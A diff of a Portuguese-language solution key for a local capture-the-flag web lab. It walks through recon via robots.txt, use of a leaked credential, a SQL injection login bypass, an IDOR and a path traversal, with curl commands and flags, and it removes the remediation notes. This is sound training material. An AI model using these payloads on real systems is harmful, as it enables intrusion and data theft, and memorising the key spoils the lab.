@@ -1,6 +1,6 @@
 # Solution - web-basic-01
 
-Gabarito tecnico do lab **web-basic-01**.
+Gabarito tecnico objetivo do lab **web-basic-01**.
 
 Escopo autorizado:
 
@@ -8,50 +8,61 @@ Escopo autorizado:
 http://localhost:8080
 ```
 
-## 1. Subir e validar
+## 1. Enumeracao
 
-```bash
-cd ~/ctf-labs/web-basic-01
-sudo docker compose up --build
-```
-
-Validar:
+Validar home:
 
 ```bash
 curl -i http://localhost:8080
-curl -i http://localhost:8080/health
 ```
 
-O `/health` revela `MiniBank Internal Portal`, versao `1.4.2-dev`, ambiente `development`, path `/usr/src/app` e banco interno `mysql://minibank-db:3306/minibank`.
-
-## 2. Enumeracao
+Procurar comentario HTML:
 
 ```bash
-curl -s http://localhost:8080 | head
 curl -s http://localhost:8080 | grep -i "<!--"
+```
+
+Comentario esperado:
+
+```html
+<!-- revisar robots.txt antes de publicar o portal legado -->
+```
+
+Ler `robots.txt`:
+
+```bash
 curl -i http://localhost:8080/robots.txt
 ```
 
-Comentario HTML:
-
-```html
-<!-- legacy admin panel moved to /admin, check robots.txt before release -->
-```
-
-Rotas em `robots.txt`:
+Rotas descobertas:
 
 - `/admin`
 - `/backup`
-- `/dev-notes.txt`
+- `/dev.txt`
 - `/download`
+- `/status`
 
-## 3. Credencial vazada em arquivo publico
+Status verboso:
 
 ```bash
-curl -i http://localhost:8080/dev-notes.txt
+curl -i http://localhost:8080/status
 ```
 
-Credencial encontrada:
+## 2. Credencial exposta
+
+Rota:
+
+```text
+GET /dev.txt
+```
+
+Acao:
+
+```bash
+curl -i http://localhost:8080/dev.txt
+```
+
+Credencial:
 
 ```text
 backup_user:backup123
@@ -63,34 +74,39 @@ Flag:
 FLAG{credencial_exposta_capturada}
 ```
 
-Validar impacto da credencial:
+Validar uso da credencial:
 
 ```bash
-curl -i http://localhost:8080/backup
 curl -i -u backup_user:backup123 http://localhost:8080/backup
 ```
 
-Sem credencial deve retornar `401`. Com credencial deve retornar `200 OK`.
+## 3. SQL Injection no login
 
-## 4. SQL Injection no login
+Rota:
+
+```text
+POST /login
+```
 
 Payload funcional:
 
 ```text
-username=admin' #
-password=qualquercoisa
+username: admin' OR '1'='1' -- 
+password: qualquercoisa
 ```
+
+O espaco apos `--` faz parte do payload para comentario MySQL.
 
 Com `curl`:
 
 ```bash
 curl -i -c admin.cookies \
-  --data-urlencode "username=admin' #" \
+  --data-urlencode "username=admin' OR '1'='1' -- " \
   --data-urlencode "password=qualquercoisa" \
   http://localhost:8080/login
 ```
 
-Validar dashboard:
+Capturar flag:
 
 ```bash
 curl -s -b admin.cookies http://localhost:8080/dashboard | grep -i "FLAG"
@@ -102,9 +118,7 @@ Flag:
 FLAG{sqli_capturada}
 ```
 
-Motivo tecnico: a rota `POST /login` concatena `username` e `password` diretamente no SQL. O `#` comenta o restante da query MySQL e ignora a verificacao de senha.
-
-## 5. IDOR em contas
+## 4. IDOR em contas
 
 Login como Joao:
 
@@ -112,12 +126,6 @@ Login como Joao:
 curl -i -c joao.cookies \
   -d "username=joao&password=joao123" \
   http://localhost:8080/login
-```
-
-Conta propria:
-
-```bash
-curl -s -b joao.cookies http://localhost:8080/account/1
 ```
 
 Conta de outro usuario:
@@ -132,17 +140,15 @@ Flag:
 FLAG{idor_capturada}
 ```
 
-Motivo tecnico: `/account/:id` exige sessao, mas busca conta apenas por `id`, sem validar `user_id` do usuario logado.
+## 5. Path Traversal / LFI controlado
 
-## 6. Path Traversal / LFI controlado
-
-Arquivo permitido:
+Arquivo normal:
 
 ```bash
 curl -i "http://localhost:8080/download?file=public-info.txt"
 ```
 
-Traversal ate o arquivo de flag:
+Traversal correto:
 
 ```bash
 curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
@@ -154,24 +160,11 @@ Flag:
 FLAG{path_traversal_capturada}
 ```
 
-Motivo tecnico: `/download?file=` usa `path.join(filesDir, requestedFile)` e le o resultado sem validar se o caminho final ainda esta dentro de `/usr/src/app/files`.
-
-## 7. Flags finais
-
-Valide as flags no repositorio usando o comando de `grep` documentado em `../VALIDATION.md`.
+## 6. Flags finais
 
 - `FLAG{sqli_capturada}`
 - `FLAG{idor_capturada}`
 - `FLAG{credencial_exposta_capturada}`
 - `FLAG{path_traversal_capturada}`
 
-Nao ha flag propria em `/admin`, `/backup`, `/health`, `robots.txt` ou comentario HTML.
-
-## 8. Recomendacoes de correcao
-
-- SQL Injection: usar prepared statements, parametros e hash forte de senha.
-- IDOR: validar autorizacao por recurso, incluindo `user_id` na consulta ou regra equivalente.
-- Credencial vazada: remover segredo de `public`, rotacionar credencial e usar secret manager/variaveis de ambiente.
-- Path Traversal: usar allowlist, normalizar caminho e garantir que o path final permanece no diretorio permitido.
-- Healthcheck: retornar somente status minimo para acesso externo.
-- Comentarios/robots: remover pistas operacionais do HTML e nao usar `robots.txt` como protecao.
+Validar com o comando documentado em `../VALIDATION.md`.
